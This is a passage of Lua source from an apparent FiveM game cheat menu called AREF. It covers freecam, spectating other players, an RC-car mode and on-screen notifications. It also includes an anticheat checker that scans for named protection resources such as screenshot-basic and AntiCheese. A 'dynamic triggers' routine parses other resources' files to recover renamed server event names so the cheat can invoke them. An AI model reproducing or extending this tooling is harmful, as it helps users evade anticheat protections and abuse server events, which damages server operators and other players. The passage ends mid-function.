            AREF:GetFunction("DisableControlAction")(0, 100, off)
   
            AREF:GetFunction("DisableControlAction")(0, 142, off)
   
            AREF:GetFunction("DisableControlAction")(0, 143, off)
   
            AREF:GetFunction("DisableControlAction")(0, 263, off)
   
            AREF:GetFunction("DisableControlAction")(0, 264, off)
   
            AREF:GetFunction("DisableControlAction")(0, 257, off)
   
            AREF:GetFunction("DisableControlAction")(1, AREF.Keys["C"], off)
   
            AREF:GetFunction("DisableControlAction")(1, AREF.Keys["F"], off)
   
            AREF:GetFunction("DisableControlAction")(1, AREF.Keys["LEFTCTRL"], off)
   
            AREF:GetFunction("DisableControlAction")(1, AREF.Keys["MOUSE1"], off)
   
            AREF:GetFunction("DisableControlAction")(1, 25, off)
   
            AREF:GetFunction("DisableControlAction")(1, AREF.Keys["R"], off)
   
            AREF:GetFunction("DisableControlAction")(1, 45, off)
   
            AREF:GetFunction("DisableControlAction")(1, 80, off)
   
            AREF:GetFunction("DisableControlAction")(1, 140, off)
   
            AREF:GetFunction("DisableControlAction")(1, 250, off)
   
            AREF:GetFunction("DisableControlAction")(1, 263, off)
   
            AREF:GetFunction("DisableControlAction")(1, 310, off)
   
            AREF:GetFunction("DisableControlAction")(1, AREF.Keys["TAB"], off)
   
            AREF:GetFunction("DisableControlAction")(1, AREF.Keys["SPACE"], off)
   
            AREF:GetFunction("DisableControlAction")(1, AREF.Keys["X"], off)
   
        end
   
    
   
        function AREF.FreeCam:DisableCombat(off)
   
            AREF:GetFunction("DisablePlayerFiring")(AREF.NetworkID, off) -- Disable weapon firing
   
            AREF:GetFunction("DisableControlAction")(0, 24, off) -- disable attack
   
            AREF:GetFunction("DisableControlAction")(0, 25, off) -- disable aim
   
            AREF:GetFunction("DisableControlAction")(1, 37, off) -- disable weapon select
   
            AREF:GetFunction("DisableControlAction")(0, 47, off) -- disable weapon
   
            AREF:GetFunction("DisableControlAction")(0, 58, off) -- disable weapon
   
            AREF:GetFunction("DisableControlAction")(0, 140, off) -- disable melee
   
            AREF:GetFunction("DisableControlAction")(0, 141, off) -- disable melee
   
            AREF:GetFunction("DisableControlAction")(0, 142, off) -- disable melee
   
            AREF:GetFunction("DisableControlAction")(0, 143, off) -- disable melee
   
            AREF:GetFunction("DisableControlAction")(0, 263, off) -- disable melee
   
            AREF:GetFunction("DisableControlAction")(0, 264, off) -- disable melee
   
            AREF:GetFunction("DisableControlAction")(0, 257, off) -- disable melee
   
        end
   
    
   
        function AREF:EnableMouse()
   
            self:GetFunction("EnableControlAction")(0, 1, true)
   
            self:GetFunction("EnableControlAction")(0, 2, true)
   
            self:GetFunction("EnableControlAction")(0, 3, true)
   
            self:GetFunction("EnableControlAction")(0, 4, true)
   
            self:GetFunction("EnableControlAction")(0, 5, true)
   
            self:GetFunction("EnableControlAction")(0, 6, true)
   
            self:GetFunction("EnableControlAction")(1, 1, true)
   
            self:GetFunction("EnableControlAction")(1, 2, true)
   
            self:GetFunction("EnableControlAction")(1, 3, true)
   
            self:GetFunction("EnableControlAction")(1, 4, true)
   
            self:GetFunction("EnableControlAction")(1, 5, true)
   
            self:GetFunction("EnableControlAction")(1, 6, true)
   
        end
   
    
   
        function AREF.FreeCam:MoveCamera(cam, x, y, z)
   
            if AREF:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and AREF:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and AREF:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return x, y, z end
   
            if self.Rotating then return x, y, z end
   
            local curVec = vector3(x, y, z)
   
            local rightVec, forwardVec, upVec = AREF:GetFunction("GetCamMatrix")(cam)
   
            local speed = 1.0
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTCTRL"]) then
   
                speed = 0.1
   
            elseif AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                speed = 3.0
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["W"]) then
   
                curVec = curVec + forwardVec * speed
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["S"]) then
   
                curVec = curVec - forwardVec * speed
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["A"]) then
   
                curVec = curVec - rightVec * speed
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["D"]) then
   
                curVec = curVec + rightVec * speed
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["SPACE"]) then
   
                curVec = curVec + upVec * speed
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["X"]) then
   
                curVec = curVec - upVec * speed
   
            end
   
    
   
            return curVec.x, curVec.y, curVec.z
   
        end
   
    
   
        function AREF.FreeCam:DrawMode()
   
            local name = self.ModeNames[self.Mode]
   
            AREF:ScreenText("[" .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, AREF.Name) .. "] Freecam Mode: " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, name), 4, 1.0, 0.5, 0.97, 0.35, 255, 255, 255, 225)
   
        end
   
    
   
        local _on
   
    
   
        function AREF.FreeCam:Tick()
   
            if not AREF:GetFunction("DoesCamExist")(self.Cam) then
   
                self.Cam = AREF:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)
   
                AREF:GetFunction("SetCamShakeAmplitude")(self.Cam, 0.0)
   
            end
   
    
   
            while AREF.Enabled do
   
                AREF.FreeCam:Switcher()
   
                local rot_vec = AREF:GetFunction("GetGameplayCamRot")(0)
   
                Wait(0)
   
    
   
                if self.On and not _on then
   
                    AREF:GetFunction("SetCamActive")(self.Cam, true)
   
                    AREF:GetFunction("SetCamAffectsAiming")(self.Cam, false)
   
                    AREF:GetFunction("SetCamActive")(AREF:GetFunction("GetRenderingCam")(), false)
   
                    AREF:GetFunction("RenderScriptCams")(true, false, false, true, true)
   
                    _on = true
   
                    local coords = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(AREF.LocalPlayer, 0.0, 0.0, 0.0) + (AREF:GetFunction("GetEntityForwardVector")(AREF.LocalPlayer) * 2)
   
                    camX, camY, camZ = coords.x, coords.y, coords.z + 1.0
   
                    AREF:GetFunction("ClearPedTasks")(AREF.LocalPlayer)
   
                    self:DeletePreview()
   
                elseif not self.On and _on then
   
                    AREF:GetFunction("SetCamActive")(self.Cam, false)
   
                    AREF:GetFunction("SetCamActive")(AREF:GetFunction("GetRenderingCam")(), true)
   
                    AREF:GetFunction("RenderScriptCams")(false, false, false, false, false)
   
                    AREF:GetFunction("SetFocusEntity")(AREF.LocalPlayer)
   
                    self:DisableMovement(false)
   
                    self:DeletePreview()
   
                    _on = false
   
                end
   
    
   
                if self.On and _on then
   
                    AREF:GetFunction("DisableAllControlActions")(0)
   
                    AREF:EnableMouse()
   
                    AREF:GetFunction("StopGameplayCamShaking")(true)
   
                    local coords = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(AREF.LocalPlayer)
   
                    AREF:GetFunction("RequestCollisionAtCoord")(coords.x, coords.y, coords.z)
   
                    AREF:DrawIbuttons()
   
                    self:DrawMode()
   
                    self:DisableMovement(true)
   
                    AREF:GetFunction("SetFocusPosAndVel")(camX, camY, camZ, 0, 0, 0)
   
                    AREF:GetFunction("SetCamCoord")(self.Cam, camX, camY, camZ)
   
                    AREF:GetFunction("SetCamRot")(self.Cam, rot_vec.x + 0.0, rot_vec.y + 0.0, rot_vec.z + 0.0)
   
                    camX, camY, camZ = self:MoveCamera(self.Cam, camX, camY, camZ)
   
                    self:ManipulationLogic(self.Cam, camX, camY, camZ)
   
                end
   
            end
   
        end
   
    
   
        function AREF:Spectate(who)
   
            self.FreeCam.On = false
   
            self.RCCar.CamOn = false
   
    
   
            if not who then
   
                self.SpectatingPlayer = nil
   
                self.Spectating = false
   
    
   
                return
   
            end
   
    
   
            dict.spectating_fov = -3.9
   
            self.SpectatingPlayer = who
   
            self.Spectating = true
   
        end
   
    
   
        function AREF:DoRCCar(driver, veh)
   
            if self.RCCar.On then
   
                AREF:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(self.RCCar.Driver, false)
   
                AREF:GetFunction("ClearPedTasks")(self.RCCar.Driver)
   
                AREF:GetFunction("ClearPedSecondaryTask")(self.RCCar.Driver)
   
    
   
                if driver then
   
                    self.Util:DeleteEntity(self.RCCar.Driver)
   
                    AREF:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.RCCar.Vehicle, false)
   
                    AREF:GetFunction("SetVehicleDoorsLocked")(self.RCCar.Vehicle, 7)
   
                else
   
                    if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                        TaskLeaveAnyVehicle(self.RCCar.Driver)
   
                        AREF:GetFunction("TaskWanderStandard")(self.RCCar.Driver)
   
                    else
   
                        AREF:GetFunction("TaskVehicleDriveWander")(self.RCCar.Driver, AREF:GetFunction("GetVehiclePedIsIn")(self.RCCar.Driver), 1000.0, 60)
   
                    end
   
    
   
                    AREF:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.RCCar.Vehicle, false)
   
                    AREF:GetFunction("SetVehicleDoorsLocked")(self.RCCar.Vehicle, 7)
   
                end
   
            end
   
    
   
            if not driver then
   
                self.RCCar.On = false
   
                self.RCCar.Driver = nil
   
                self.RCCar.Vehicle = nil
   
    
   
                return
   
            end
   
    
   
            self.RCCar.On = true
   
            self.RCCar.Driver = driver
   
            self.RCCar.Vehicle = veh
   
        end
   
    
   
        AREF.Spectating = false
   
        local spec_on
   
    
   
        function AREF:Polar3DToWorld(entityPosition, radius, polarAngleDeg, azimuthAngleDeg)
   
            local polarAngleRad = polarAngleDeg * dict.math.pi / 180.0
   
            local azimuthAngleRad = azimuthAngleDeg * dict.math.pi / 180.0
   
    
   
            return {
   
                x = entityPosition.x + radius * (dict.math.sin(azimuthAngleRad) * dict.math.cos(polarAngleRad)),
   
                y = entityPosition.y - radius * (dict.math.sin(azimuthAngleRad) * dict.math.sin(polarAngleRad)),
   
                z = entityPosition.z - radius * dict.math.cos(azimuthAngleRad)
   
            }
   
        end
   
    
   
        local polar, azimuth = 0, 90
   
    
   
        function AREF:SpectateTick()
   
            if not self:GetFunction("DoesCamExist")(self.SpectateCam) then
   
                self.SpectateCam = self:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)
   
                self:GetFunction("SetCamShakeAmplitude")(self.SpectateCam, 0.0)
   
            end
   
    
   
            while self.Enabled do
   
                Wait(0)
   
    
   
                if self.Spectating and not spec_on then
   
                    self:GetFunction("SetCamActive")(self.SpectateCam, true)
   
                    self:GetFunction("SetCamAffectsAiming")(self.Cam, false)
   
                    self:GetFunction("SetCamActive")(self:GetFunction("GetRenderingCam")(), false)
   
                    self:GetFunction("RenderScriptCams")(true, false, false, true, true)
   
                    spec_on = true
   
                    self:GetFunction("ClearPedTasks")(self.LocalPlayer)
   
                elseif not self.Spectating and spec_on then
   
                    self:GetFunction("SetCamActive")(self.SpectateCam, false)
   
                    self:GetFunction("SetCamActive")(self:GetFunction("GetRenderingCam")(), true)
   
                    self:GetFunction("RenderScriptCams")(false, false, false, false, false)
   
                    self:GetFunction("SetFocusEntity")(self.LocalPlayer)
   
                    self.FreeCam:DisableMovement(false)
   
                    spec_on = false
   
                end
   
    
   
                if self.Spectating and spec_on then
   
                    self:GetFunction("StopGameplayCamShaking")(true)
   
    
   
                    if not self.SpectatingPlayer or not self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
   
                        self.Spectating = false
   
                    end
   
    
   
                    local ent = self:GetFunction("GetPlayerPed")(self.SpectatingPlayer)
   
    
   
                    if self:GetFunction("IsPedInAnyVehicle")(ent) then
   
                        ent = self:GetFunction("GetVehiclePedIsIn")(ent)
   
                    end
   
    
   
                    local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)
   
    
   
                    if not self.Showing then
   
                        local magX, magY = self:GetFunction("GetDisabledControlNormal")(0, 1), self:GetFunction("GetDisabledControlNormal")(0, 2)
   
                        polar = polar + magX * 10
   
    
   
                        if polar >= 360 then
   
                            polar = 0
   
                        end
   
    
   
                        azimuth = azimuth + magY * 10
   
    
   
                        if azimuth >= 360 then
   
                            azimuth = 0
   
                        end
   
                    end
   
    
   
                    if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MWHEELUP"]) then
   
                        dict.spectating_fov = dict.spectating_fov + 0.1
   
    
   
                        if dict.spectating_fov > 10.0 then
   
                            dict.spectating_fov = 10.0
   
                        end
   
                    end
   
    
   
                    if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MWHEELDOWN"]) then
   
                        dict.spectating_fov = dict.spectating_fov - 0.1
   
    
   
                        if dict.spectating_fov < -10.0 then
   
                            dict.spectating_fov = -10.0
   
                        end
   
                    end
   
    
   
                    local where = self:Polar3DToWorld(coords, dict.spectating_fov, polar, azimuth)
   
                    local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer)
   
                    self:GetFunction("RequestCollisionAtCoord")(coords.x, coords.y, coords.z)
   
                    self.FreeCam:DisableMovement(true)
   
                    self:GetFunction("SetFocusPosAndVel")(where.x, where.y, where.z, 0, 0, 0)
   
                    self:GetFunction("SetCamCoord")(self.SpectateCam, where.x, where.y, where.z)
   
                    self:GetFunction("PointCamAtEntity")(self.SpectateCam, ent)
   
                end
   
            end
   
        end
   
    
   
        function AREF:ScreenText(text, font, centered, x, y, scale, r, g, b, a)
   
            AREF:GetFunction("SetTextFont")(font)
   
            AREF:GetFunction("SetTextProportional")()
   
            AREF:GetFunction("SetTextScale")(scale, scale)
   
            AREF:GetFunction("SetTextColour")(r, g, b, a)
   
            AREF:GetFunction("SetTextDropShadow")(0, 0, 0, 0, 255)
   
            AREF:GetFunction("SetTextEdge")(1, 0, 0, 0, 255)
   
            AREF:GetFunction("SetTextDropShadow")()
   
            AREF:GetFunction("SetTextOutline")()
   
            AREF:GetFunction("SetTextCentre")(centered)
   
            AREF:GetFunction("BeginTextCommandDisplayText")("STRING")
   
            AREF:GetFunction("AddTextComponentSubstringPlayerName")(text)
   
            AREF:GetFunction("EndTextCommandDisplayText")(x, y)
   
        end
   
    
   
        function AREF:NotificationAlpha(fade_out)
   
            last_alpha = AREF:GetFunction("GetGameTimer")() + dict.math.huge
   
            if doing_alpha and not fade_out then return end
   
            doing_alpha = true
   
    
   
            CreateThread(function()
   
                while notif_alpha < 200 and not fade_out do
   
                    Wait(0)
   
                    notif_alpha = notif_alpha + 10
   
                    if notif_alpha >= 200 then break end
   
                end
   
    
   
                while not fade_out and last_alpha > AREF:GetFunction("GetGameTimer")() do
   
                    Wait(0)
   
                end
   
    
   
                while notif_alpha > 0 or fade_out do
   
                    notif_alpha = notif_alpha - 8
   
                    Wait(0)
   
                    if notif_alpha <= 0 then break end
   
                end
   
    
   
                doing_alpha = false
   
            end)
   
        end
   
    
   
        local type_colors = {
   
            ["INFO"] = {
   
                text = "[~b~INFO~s~]"
   
            },
   
            ["WARN"] = {
   
                text = "[~o~WARN~s~]"
   
            },
   
            ["ERROR"] = {
   
                text = "[~r~ERROR~s~]"
   
            },
   
            ["SUCCESS"] = {
   
                text = "[~g~SUCCESS~s~]"
   
            }
   
        }
   
    
   
        function AREF:TrimString(str, only_whitespace)
   
            local char = "%s"
   
            if #str >= 70 and not only_whitespace then return str:sub(1, 67) .. "..." end
   
    
   
            return dict.string.match(str, "^" .. char .. "*(.-)" .. char .. "*$") or str
   
        end
   
    
   
        function AREF:TrimStringBasedOnWidth(str, font, size, max_width)
   
            local real_width = self.Painter:GetTextWidth(str, font, size)
   
            if real_width <= max_width then return str end
   
            local out_str = str
   
            local cur = #str
   
    
   
            while real_width > max_width and out_str ~= "" do
   
                if not str:sub(cur, cur) then break end
   
                out_str = out_str:sub(1, cur - 1)
   
                real_width = self.Painter:GetTextWidth(out_str, font, size)
   
                cur = cur - 1
   
            end
   
    
   
            return out_str:sub(1, #out_str - 3) .. "..."
   
        end
   
    
   
        function AREF:RGBToHex(rgb)
   
            local hexadecimal = ""
   
    
   
            for key, value in dict.pairs(rgb) do
   
                local hex = ""
   
    
   
                while (value > 0) do
   
                    local index = dict.math.fmod(value, 16) + 1
   
                    value = dict.math.floor(value / 16)
   
                    hex = dict.string.sub("0123456789ABCDEF", index, index) .. hex
   
                end
   
    
   
                if (dict.string.len(hex) == 0) then
   
                    hex = "00"
   
                elseif (dict.string.len(hex) == 1) then
   
                    hex = "0" .. hex
   
                end
   
    
   
                hexadecimal = hexadecimal .. hex
   
            end
   
    
   
            return hexadecimal
   
        end
   
    
   
        function AREF:DrawNotifications()
   
            dict.notifications_h = 64
   
            local max_notifs_on_screen = 20
   
            local cur_on_screen = 0
   
            if not self.Config.ShowNotifications then return end
   
    
   
            if not cur_notifs then
   
                cur_notifs = #self.Notifications
   
                self:NotificationAlpha()
   
            end
   
    
   
            if cur_notifs ~= #self.Notifications then
   
                cur_notifs = #self.Notifications
   
                self:NotificationAlpha()
   
            end
   
    
   
            if self.Showing then
   
                notif_alpha = 200
   
            elseif not self.Showing and cur_notifs <= 0 and notif_alpha == 200 then
   
                self:NotificationAlpha(true)
   
            end
   
    
   
            if cur_notifs <= 0 and last_alpha - self:GetFunction("GetGameTimer")() >= dict.math.huge then
   
                last_alpha = self:GetFunction("GetGameTimer")() + 2000
   
            end
   
    
   
            if notif_alpha <= 0 then return end
   
            local n_x, n_y, n_w = self.Config.NotifX, self.Config.NotifY, self.Config.NotifW
   
            if not n_x or not n_y or not n_w then return end
   
            self.Painter:DrawText("~s~[" .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, AREF.Name) .. "~s~] Notifications", 4, false, n_x, n_y, 0.35, 255, 255, 255, dict.math.ceil(notif_alpha + 55))
   
    
   
            if #self.Notifications <= 0 then
   
                self.Painter:DrawText("~s~No new notifications to display.", 4, false, n_x + 0.5, n_y + 34, 0.35, 255, 255, 255, dict.math.ceil(notif_alpha + 55))
   
            else
   
                local notifY = n_y + 33
   
                local s_y = notifY
   
                local id = 1
   
    
   
                for k, v in dict.pairs(self.Notifications) do
   
                    if cur_on_screen < max_notifs_on_screen then
   
                        local left = v.Expires - self:GetFunction("GetGameTimer")()
   
                        local str = (type_colors[v.Type] or {}).text
   
    
   
                        if str == nil then
   
                            str = "BAD TYPE - " .. v.Type
   
                            v.Message = ""
   
                        end
   
    
   
                        local n_alpha = notif_alpha + 50
   
    
   
                        if left <= 0 then
   
                            dict.table.remove(self.Notifications, k)
   
                        else
   
                            local w_ = self.Painter:GetTextWidth(str, 4, 0.35)
   
                            n_alpha = dict.math.ceil(n_alpha * (left / 1000) / v.Duration)
   
                            self.Painter:DrawText(str, 4, false, n_x, notifY, 0.35, 255, 255, 255, _clamp(dict.math.ceil(n_alpha + 15), 0, 255))
   
                            self.Painter:DrawText(self:TrimStringBasedOnWidth(v.Message, 4, 0.35, n_w - w_ + 8), 4, false, n_x + w_ - 3, notifY, 0.35, 255, 255, 255, _clamp(dict.math.ceil(n_alpha + 15), 0, 255))
   
                            notifY = notifY + 22
   
                            id = id + 1
   
                            cur_on_screen = cur_on_screen + 1
   
                        end
   
                    end
   
                end
   
    
   
                local e_y = notifY
   
                local diff = e_y - s_y
   
                dict.notifications_h = dict.notifications_h + (diff - 27)
   
            end
   
    
   
            self.Painter:DrawRect(n_x, n_y, 420, dict.notifications_h, 0, 0, 0, notif_alpha)
   
            self.Painter:DrawRect(n_x, n_y + 29, 420, 2, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], notif_alpha + 55)
   
        end
   
    
   
        local text_alpha = 255
   
    
   
        CreateThread(function()
   
            while AREF.Enabled do
   
                Wait(0)
   
    
   
                if not AREF.Config.ShowText then
   
                    text_alpha = _lerp(0.05, text_alpha, -255)
   
                else
   
                    text_alpha = _lerp(0.05, text_alpha, 255)
   
                end
   
    
   
                text_alpha = dict.math.ceil(text_alpha)
   
    
   
                if text_alpha > 0 then
   
                    local veh = AREF:GetFunction("GetVehiclePedIsIn")(AREF.LocalPlayer)
   
                    local br_wide = _text_width(branding.name)
   
                    local r_wide = _text_width(branding.resource)
   
                    local ip_wide = _text_width(branding.ip)
   
                    local id_wide = _text_width(branding.id)
   
                    local b_wide = _text_width(branding.build)
   
                    local v_wide
   
                    local curY = 0.895
   
    
   
                    if AREF:GetFunction("DoesEntityExist")(veh) then
   
                        v_wide = _text_width(branding.veh:format(GetDisplayNameFromVehicleModel(GetEntityModel(veh))))
   
                        curY = 0.875
   
                    end
   
    
   
                    AREF:ScreenText(branding.name, 4, 0.0, 1.0 - br_wide, curY, 0.35, 255, 255, 255, text_alpha)
   
                    curY = curY + 0.02
   
                    AREF:ScreenText(branding.resource, 4, 0.0, 1.0 - r_wide, curY, 0.35, 255, 255, 255, text_alpha)
   
                    curY = curY + 0.02
   
                    AREF:ScreenText(branding.ip, 4, 0.0, 1.0 - ip_wide, curY, 0.35, 255, 255, 255, text_alpha)
   
                    curY = curY + 0.02
   
                    AREF:ScreenText(branding.id, 4, 0.0, 1.0 - id_wide, curY, 0.35, 255, 255, 255, text_alpha)
   
                    curY = curY + 0.02
   
    
   
                    if AREF:GetFunction("DoesEntityExist")(veh) then
   
                        AREF:ScreenText(branding.veh:format(GetDisplayNameFromVehicleModel(GetEntityModel(veh))), 4, 0.0, 1.0 - v_wide, curY, 0.35, 255, 255, 255, text_alpha)
   
                        curY = curY + 0.02
   
                    end
   
    
   
                    AREF:ScreenText(branding.build, 4, 0.0, 1.0 - b_wide, curY, 0.35, 255, 255, 255, text_alpha)
   
                end
   
            end
   
        end)
   
    
   
        local RList = {
   
            {
   
                Resource = "alpha-tango-golf",
   
                Name = "~b~ATG",
   
                Pattern = function(res, resources) return resources[res] end
   
            },
   
            {
   
                Resource = "screenshot-basic",
   
                Name = "~g~screenshot-basic",
   
                Pattern = function(res, resources) return resources[res] end
   
            },
   
            {
   
                Resource = "anticheese-anticheat",
   
                Name = "~g~AntiCheese",
   
                Pattern = function(res, resources) return resources[res] end
   
            },
   
            {
   
                Resource = "ChocoHax",
   
                Name = "~r~ChocoHax",
   
                Pattern = function() return ChXaC ~= nil end
   
            }
   
        }
   
    
   
        local file_dicts = {"client_script", "file", "shared_script"}
   
        local resource_dicts = {"__resource.lua", "fxmanifest.lua"}
   
    
   
        function AREF:GetResourceData(name)
   
            local data = {
   
                files = {},
   
                main = {}
   
            }
   
    
   
            for _, str in dict.ipairs(file_dicts) do
   
                local meta_keys = self:GetFunction("GetNumResourceMetadata")(name, str)
   
    
   
                for meta_key = 0, meta_keys - 1 do
   
                    local path = self:GetFunction("GetResourceMetadata")(name, str, meta_key)
   
    
   
                    if path and dict.type(path) == "string" and not path:find("@") then
   
                        data.files[path] = true
   
                    end
   
                end
   
            end
   
    
   
            for _, str in dict.ipairs(resource_dicts) do
   
                if self:GetFunction("LoadResourceFile")(name, str) ~= nil then
   
                    data.main[str] = true
   
                end
   
            end
   
    
   
            return data
   
        end
   
    
   
        function AREF:RunACChecker()
   
            AREF:Print("[AC Checker] Checking...")
   
    
   
            for i = 1, AREF:GetFunction("GetNumResources")() do
   
                local name = AREF:GetFunction("GetResourceByFindIndex")(i)
   
    
   
                if dict.type(name) == "string" and AREF:GetFunction("GetResourceState")(name) == "started" then
   
                    resource_list[name] = true
   
                    resource_data[name] = self:GetResourceData(name)
   
                end
   
            end
   
    
   
            for _, dat in dict.pairs(RList) do
   
                if dat.Pattern(dat.Resource, resource_list) then
   
                    self:AddNotification("WARN", dat.Name .. " ~s~Detected!", 30000)
   
                    AREF:Print("[AC Checker] Found ^3" .. dat.Resource .. "^7")
   
                end
   
            end
   
        end
   
    
   
        function AREF:GetResourceFile(res, file)
   
            if not resource_data[res] then return end
   
            local files = resource_data[res].files
   
            if files[file] then return file end
   
    
   
            for str, _ in dict.pairs(files) do
   
                if str:find(file) then return str end
   
            end
   
        end
   
    
   
        local function _split(content, pattern)
   
            local lines = {}
   
    
   
            for s in content:gmatch(pattern) do
   
                lines[#lines + 1] = s
   
            end
   
    
   
            return lines
   
        end
   
    
   
        local function _find(tab, what)
   
            local ret = {}
   
    
   
            for id, val in dict.pairs(tab) do
   
                if val == what or val:find(what) then
   
                    ret[#ret + 1] = id
   
                end
   
            end
   
    
   
            return ret
   
        end
   
    
   
        local function _get_depth(line, lines, deep)
   
            local out = {}
   
    
   
            for i = -deep, deep do
   
                out[line + i] = lines[line + i]
   
            end
   
    
   
            return out
   
        end
   
    
   
        local function _replaced(res, data, suppress)
   
            local replaced
   
            if not resource_list[res] then return end
   
    
   
            if dict.type(data.File) == "table" then
   
                for _, file in dict.ipairs(data.File) do
   
                    file = AREF:GetResourceFile(res, file)
   
    
   
                    if file then
   
                        local contents = AREF:GetFunction("LoadResourceFile")(res, file)
   
                        if contents ~= nil and type(contents) ~= "string" then return FM:AddNotification("ERROR", "A fatal error occured while trying to load the file.", 5000) end
   
                        if not contents or contents == "nil" or contents:len() <= 0 then return end
   
                        local lines = _split(contents, "[^\r\n]+")
   
    
   
                        for _, dat in dict.pairs(data.KnownTriggers) do
   
                            local content
   
                            local line
   
    
   
                            if dat.LookFor then
   
                                local _lines = _find(lines, dat.LookFor)
   
    
   
                                if _lines then
   
                                    for k, _line in dict.pairs(_lines) do
   
                                        local depth = dat.Depth or 3
   
                                        local possible = _get_depth(_line, lines, depth)
   
    
   
                                        for _, val in dict.pairs(possible) do
   
                                            local match
   
    
   
                                            for _, x in dict.pairs(dat.Strip) do
   
                                                if val:find(x) then
   
                                                    if match == val then break end
   
                                                    match = val
   
                                                else
   
                                                    match = nil
   
                                                end
   
                                            end
   
    
   
                                            if match then
   
                                                content = match
   
                                                break
   
                                                break
   
                                            end
   
                                        end
   
                                    end
   
                                end
   
                            else
   
                                content = lines[dat.Line]
   
                            end
   
    
   
                            if content then
   
                                local contains
   
    
   
                                for _, strip in dict.pairs(dat.Strip) do
   
                                    if not contains then
   
                                        contains = content:find(strip) ~= nil
   
                                    end
   
    
   
                                    content = content:gsub(strip, "")
   
                                end
   
    
   
                                content = AREF:TrimString(content, true)
   
                                AREF.DynamicTriggers[res] = AREF.DynamicTriggers[res] or {}
   
    
   
                                if contains and content ~= dat.Trigger then
   
                                    replaced = true
   
    
   
                                    if (content:find("'" .. dat.Trigger .. "'") or content:find("\"" .. dat.Trigger .. "\"")) and not dat.Force then
   
                                        content = dat.Trigger
   
                                        replaced = false
   
                                    end
   
    
   
                                    AREF.DynamicTriggers[res][dat.Trigger] = content
   
    
   
                                    if replaced and not suppress then
   
                                        AREF:Print("[Dynamic Triggers] ^5Replaced trigger ^6" .. dat.Trigger .. " ^7to ^3" .. content .. "^7")
   
                                    end
   
                                elseif contains and content == dat.Trigger then
   
                                    AREF.DynamicTriggers[res][dat.Trigger] = dat.Trigger
   
    
   
                                    if not suppress then
   
                                        AREF:Print("[Dynamic Triggers] ^2Unchanged ^7trigger ^6" .. dat.Trigger .. "^7")
   
                                    end
   
    
   
                                    replaced = true
   
                                elseif not suppress then
   
                                    AREF:AddNotification("ERROR", "Failed to get dynamic trigger " .. dat.Trigger, 20000)
   
                                    AREF:Print("[Dynamic Triggers] ^1Failed ^7to get trigger ^6" .. dat.Trigger .. "^7")
   
                                end
   
                            elseif not suppress then
   
                                AREF:Print("[Dynamic Triggers] Resource not found. (" .. res .. ")")
   
                            end
   
                        end
   
                    end
   
                end
   
            else
   
                local file = AREF:GetResourceFile(res, data.File)
   
    
   
                if file then
   
                    local contents = AREF:GetFunction("LoadResourceFile")(res, file)
   
                    if not contents or contents == "nil" or contents:len() <= 0 then return end
   
                    local lines = _split(contents, "[^\r\n]+")
   
    
   
                    for _, dat in dict.pairs(data.KnownTriggers) do
   
                        local content = ""
   
                        local line
   
    
   
                        if dat.LookFor then
   
                            local _lines = _find(lines, dat.LookFor)
   
    
   
                            if _lines then
   
                                for k, _line in dict.pairs(_lines) do
   
                                    local depth = dat.Depth or 3
   
                                    local possible = _get_depth(_line, lines, depth)
   
    
   
                                    for _, val in dict.pairs(possible) do
   
                                        local match
   
    
   
                                        for _, x in dict.pairs(dat.Strip) do
   
                                            if val:find(x) then
   
                                                if match == val then break end
   
                                                match = val
   
                                            else
   
                                                match = nil
   
                                            end
   
                                        end
   
    
   
                                        if match then
   
                                            content = match
   
                                            break
   
                                            break
   
                                        end
   
                                    end
   
                                end
   
                            end
   
                        else
   
                            content = lines[dat.Line]
   
                        end
   
    
   
                        if content then
   
                            local contains
   
    
   
                            for _, strip in dict.pairs(dat.Strip) do
   
                                if not contains then
   
                                    contains = content:find(strip) ~= nil
   
                                end
   
    
   
                                content = content:gsub(strip, "")
   
                            end
   
    
   
                            content = AREF:TrimString(content, true)
   
                            AREF.DynamicTriggers[res] = AREF.DynamicTriggers[res] or {}
   
    
   
                            if contains and content ~= dat.Trigger then
   
                                replaced = true
   
    
   
                                if (content:find("'" .. dat.Trigger .. "'") or content:find("\"" .. dat.Trigger .. "\"")) and not dat.Force then
   
                                    content = dat.Trigger
   
                                    replaced = false
   
                                end
   
    
   
                                AREF.DynamicTriggers[res][dat.Trigger] = content
   
    
   
                                if replaced then
   
                                    AREF:Print("[Dynamic Triggers] ^5Replaced trigger ^6" .. dat.Trigger .. " ^7to ^3" .. content .. "^7")
   
                                end
   
                            elseif contains and content == dat.Trigger then
   
                                AREF.DynamicTriggers[res][dat.Trigger] = dat.Trigger
   
                                AREF:Print("[Dynamic Triggers] ^2Unchanged ^7trigger ^6" .. dat.Trigger .. "^7")
   
